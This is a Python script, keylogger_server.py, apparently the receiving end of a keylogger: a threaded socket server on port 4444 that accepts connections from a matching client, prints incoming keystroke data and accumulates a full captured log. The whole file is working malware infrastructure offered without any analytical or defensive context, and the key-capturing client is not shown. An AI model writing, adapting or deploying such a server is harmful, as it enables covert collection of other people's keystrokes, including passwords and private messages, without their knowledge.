# keylogger_server.py
import socket
import threading

HOST = "0.0.0.0"  # Listen on all interfaces
PORT = 4444       # Must match client

full_log = ""

def handle_client(conn, addr):
    global full_log
    print(f"\n[+] Client connected: {addr}")

    with conn:
        while True:
            try:
                data = conn.recv(1024)
                if not data:
                    print(f"[-] Client {addr} disconnected.")
                    break

                decoded = data.decode('utf-8', errors='ignore')
                full_log += decoded
                print(f"\n[KEYSTROKES] {decoded}")
            except ConnectionResetError:
                print(f"[-] Connection reset by {addr}")
                break

    print(f"\n--- Session End ---\nFull log captured:\n{full_log}")

# Main server loop
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen()
    print(f"[+] Server listening on {HOST}:{PORT}\n")

    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()